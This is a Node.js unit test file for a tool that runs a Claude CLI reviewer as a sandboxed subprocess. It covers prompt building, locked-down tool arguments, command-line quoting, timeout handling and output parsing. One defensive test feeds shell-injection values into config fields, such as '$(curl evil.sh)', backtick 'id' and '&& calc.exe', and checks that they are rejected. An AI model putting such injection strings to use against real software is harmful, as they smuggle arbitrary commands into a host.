// =============================================================================
// reviewer.test.mjs — 审阅后端单测（提示词 / 安全参数 / 输出解析 / 进程编排）
// =============================================================================
import { test } from "node:test";
import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import {
  buildReviewPrompt, reviewerArgs, buildCommandLine, runReviewer, parseReviewerOutput,
} from "../src/reviewer.mjs";
import { normalizeFindings } from "../src/core.mjs";

const BASE_CONFIG = {
  reviewerCommand: "claude",
  reviewerArgs: [],
  reviewModel: undefined,
  reviewTimeoutMs: 120000,
};

// ---------- 提示词（上下文包） ----------
test("buildReviewPrompt: 包含被审回答、用户问题、输出契约与无发现许可", () => {
  const p = buildReviewPrompt({
    answer: "最终方案：双阶段迁移。",
    userQuestion: "数据库迁移怎么做？",
    focus: null,
    evidence: null,
  });
  assert.ok(p.includes("最终方案：双阶段迁移。"));
  assert.ok(p.includes("数据库迁移怎么做？"));
  assert.ok(p.includes("no_material_findings"));
  assert.ok(p.includes("verdict"));
  assert.ok(p.includes("evidence")); // 无依据的问题不要提
});

test("buildReviewPrompt: 未提供用户问题/焦点/证据时的占位形态", () => {
  const p = buildReviewPrompt({ answer: "回答" });
  assert.ok(p.includes("（未提供，仅凭回答本身判断）"));
  assert.ok(!p.includes("【用户指定的攻击方向】"));
  assert.ok(!p.includes("【附加证据"));
});

test("buildReviewPrompt: focus 与 evidence 段落注入", () => {
  const p = buildReviewPrompt({ answer: "A", userQuestion: "Q", focus: "重点看并发", evidence: "diff 摘要" });
  assert.ok(p.includes("重点看并发"));
  assert.ok(p.includes("diff 摘要"));
});

// ---------- 固定安全参数 ----------
test("reviewerArgs: 固定包含 --bare、--tools 空串与全工具 deny，且不可被配置覆盖", () => {
  const args = reviewerArgs(BASE_CONFIG);
  const s = args.join(" ");
  assert.ok(args.includes("--bare"));
  assert.ok(args.includes("-p"));
  assert.equal(args[args.indexOf("--tools") + 1], ""); // 空串 = 全部内置工具移出上下文（2026-11-20 实机核对）
  assert.ok(args.includes("--disallowedTools") && args.includes("*")); // 硬 deny 双保险
  assert.ok(args.includes("--output-format") && args.includes("json"));
  assert.ok(args.includes("--max-turns"));
  assert.ok(!s.includes("--allow")); // 没有任何放行参数
});

test("buildCommandLine: 空串参数被引号保护，特殊字符参数被包裹", () => {
  const line = buildCommandLine(BASE_CONFIG, {});
  assert.ok(line.includes('--tools ""'), `空参数必须有引号: ${line}`);
  assert.ok(line.includes('"*"'), `星号必须带引号防 shell 展开: ${line}`);
  const withModel = buildCommandLine({ ...BASE_CONFIG, reviewerCommand: "C:\\tools\\my claude.cmd", reviewModel: "opus" }, {});
  assert.ok(withModel.startsWith('"C:\\tools\\my claude.cmd"')); // 含空格的命令路径被引号包裹
  assert.ok(withModel.includes("--model opus"));
  // 逃生门整体替换
  assert.equal(buildCommandLine(BASE_CONFIG, { ADV_REVIEWER_CMD: "node fake.mjs" }), "node fake.mjs");
});

test("安全净化（Bugbot #ccf429d8）: 配置值带 shell 元字符一律拒用，不让其上命令行", () => {
  // reviewModel 注入命令替换 → --model 整个被跳过
  const l1 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "$(curl evil.sh)" }, {});
  assert.ok(!l1.includes("curl"), `命令替换不得出现: ${l1}`);
  assert.ok(!l1.includes("--model"));
  // 反引号注入 → 拒用
  const l2 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "opus`id`" }, {});
  assert.ok(!l2.includes("`") && !l2.includes("--model"));
  // reviewerCommand 拼接 && → 整个命令被拒，回退默认 claude
  const l3 = buildCommandLine({ ...BASE_CONFIG, reviewerCommand: "claude && calc.exe" }, {});
  assert.ok(!l3.includes("calc"), `拼接命令不得出现: ${l3}`);
  assert.ok(l3.startsWith("claude "));
  // cmd 变量展开 %VAR% → 拒用
  const l4 = buildCommandLine({ ...BASE_CONFIG, reviewerArgs: ["--flag", "%PATH%"] }, {});
  assert.ok(!l4.includes("%PATH%"));
  assert.ok(l4.includes("--flag"), "合法的同批参数不受影响");
  // 分号/管道 → 拒用
  const l5 = buildCommandLine({ ...BASE_CONFIG, reviewerModel: undefined, reviewerArgs: ["a;b|c"] }, {});
  assert.ok(!l5.includes(";") && !l5.includes("|"));
  // 合法值（含空格路径、斜杠模型名、点版本号）不受净化影响
  const ok1 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "anthropic/claude-opus-4.5" }, {});
  assert.ok(ok1.includes("--model anthropic/claude-opus-4.5"));
  const ok2 = buildCommandLine({ ...BASE_CONFIG, reviewerArgs: ["--fallback-model", "glm-5.3-flash"] }, {});
  assert.ok(ok2.includes("glm-5.3-flash"));
});

test("reviewerArgs: 模型注入与额外参数追加", () => {
  const args = reviewerArgs({ ...BASE_CONFIG, reviewModel: "opus", reviewerArgs: ["--fallback-model", "sonnet"] });
  const i = args.indexOf("--model");
  assert.equal(args[i + 1], "opus");
  assert.ok(args.includes("--fallback-model") && args.includes("sonnet"));
});

// ---------- runReviewer 进程编排（假子进程） ----------
function fakeSpawnFactory() {
  const calls = [];
  class FakeChild extends EventEmitter {
    constructor() {
      super();
      this.stdout = new EventEmitter();
      this.stderr = new EventEmitter();
      this.stdin = new EventEmitter();
      this.stdin.write = (d) => { this.written = (this.written || "") + d; return true; };
      this.stdin.end = () => { this.ended = true; };
      this.kill = (sig) => {
        this.killSignal = sig;
        this.killed = true;
        // 模拟真实行为：kill 后进程死亡并触发 close（真实 child_process 如此）
        setImmediate(() => this.emit("close", null));
        return true;
      };
      this.pid = 4321;
      this.written = "";
    }
    emitClose(code) {
      setImmediate(() => this.emit("close", code));
    }
  }
  return {
    calls,
    spawnFn(commandLine, opts) {
      const child = new FakeChild();
      calls.push({ commandLine, opts, child });
      return child;
    },
  };
}

test("runReviewer: 命令行拼接正确、提示词走 stdin、正常回包", async () => {
  const f = fakeSpawnFactory();
  const p = runReviewer({ prompt: "提示词内容", config: BASE_CONFIG, env: {}, spawnFn: f.spawnFn, platform: "win32" });
  const { child } = f.calls[0];
  assert.equal(f.calls.length, 1);
  assert.ok(f.calls[0].commandLine.includes('--disallowedTools "*"'));
  assert.ok(f.calls[0].commandLine.includes('--tools ""'));
  assert.equal(child.written, "提示词内容");
  assert.equal(child.ended, true);
  child.stdout.emit("data", Buffer.from('{"result":"文本"}'));
  child.emitClose(0);
  const run = await p;
  assert.equal(run.ok, true);
  assert.equal(run.code, 0);
  assert.equal(run.timedOut, false);
  assert.ok(run.stdout.includes("文本"));
});

test("runReviewer: ADV_REVIEWER_CMD 逃生门整体替换命令行", async () => {
  const f = fakeSpawnFactory();
  const p = runReviewer({ prompt: "x", config: BASE_CONFIG, env: { ADV_REVIEWER_CMD: "node fake-reviewer.mjs --case findings" }, spawnFn: f.spawnFn, platform: "win32" });
  f.calls[0].child.emitClose(0);
  await p;
  assert.equal(f.calls[0].commandLine, "node fake-reviewer.mjs --case findings");
});

test("runReviewer: 超时杀子进程并标记 timedOut", async () => {
  const f = fakeSpawnFactory();
  const config = { ...BASE_CONFIG, reviewTimeoutMs: 300 };
  // platform 传 "linux"：让超时走 child.kill 分支（假子进程），避免对假 pid 发起真实 taskkill
  const p = runReviewer({ prompt: "x", config, env: {}, spawnFn: f.spawnFn, platform: "linux" });
  const child = f.calls[0].child;
  // 不回包，等超时
  const run = await p;
  assert.equal(run.timedOut, true);
  assert.equal(run.ok, false);
  assert.equal(child.killed, true);
});

test("runReviewer: 子进程 spawn 抛错 → resolve 错误结果（不 reject）", async () => {
  const spawnFn = () => { throw new Error("spawn failed"); };
  const run = await runReviewer({ prompt: "x", config: BASE_CONFIG, env: {}, spawnFn, platform: "win32" });
  assert.equal(run.ok, false);
  assert.match(run.stderr, /spawn failed/);
});

// ---------- parseReviewerOutput ----------
test("parseReviewerOutput: claude JSON 包裹的有效发现", () => {
  const inner = JSON.stringify({ verdict: "material_findings", findings: [{ severity: "high", finding: "F", evidence: "E", impact: "I", recommendation: "R" }] });
  const run = { ok: true, code: 0, stdout: JSON.stringify({ type: "result", is_error: false, result: inner }), timedOut: false, durationMs: 100 };
  const r = parseReviewerOutput(run, normalizeFindings);
  assert.equal(r.ok, true);
  assert.equal(r.verdict, "material_findings");
  assert.equal(r.findings.length, 1);
});

test("parseReviewerOutput: 模型文本带杂质时宽容提取", () => {
  const inner = JSON.stringify({ verdict: "no_material_findings", findings: [] });
  const run = { ok: true, code: 0, stdout: JSON.stringify({ type: "result", is_error: false, result: "结论：\n" + inner + "\n完" }), timedOut: false, durationMs: 100 };
  const r = parseReviewerOutput(run, normalizeFindings);
  assert.equal(r.ok, true);
  assert.equal(r.verdict, "no_material_findings");
});

test("parseReviewerOutput: 超时/非零退出/空输出/is_error 都失败且不阻断", () => {
  const t = parseReviewerOutput({ ok: false, code: null, stdout: "", stderr: "", timedOut: true, durationMs: 1000 }, normalizeFindings);
  assert.equal(t.ok, false);
  assert.match(t.error, /timed out/);
  const e = parseReviewerOutput({ ok: false, code: 3, stdout: "", stderr: "boom", timedOut: false, durationMs: 10 }, normalizeFindings);
  assert.equal(e.ok, false);
  assert.match(e.error, /code 3/);
  const empty = parseReviewerOutput({ ok: true, code: 0, stdout: "", stderr: "", timedOut: false, durationMs: 10 }, normalizeFindings);
  assert.equal(empty.ok, false);
  const err = parseReviewerOutput({ ok: true, code: 0, stdout: JSON.stringify({ is_error: true, result: "oops" }), timedOut: false, durationMs: 10 }, normalizeFindings);
  assert.equal(err.ok, false);
});

test("parseReviewerOutput: 非 JSON stdout 退化为按纯文本解析", () => {
  const inner = JSON.stringify({ verdict: "material_findings", findings: [{ finding: "直接文本发现" }] });
  const run = { ok: true, code: 0, stdout: inner, timedOut: false, durationMs: 10 };
  const r = parseReviewerOutput(run, normalizeFindings);
  assert.equal(r.ok, true);
  assert.equal(r.findings[0].finding, "直接文本发现");
});
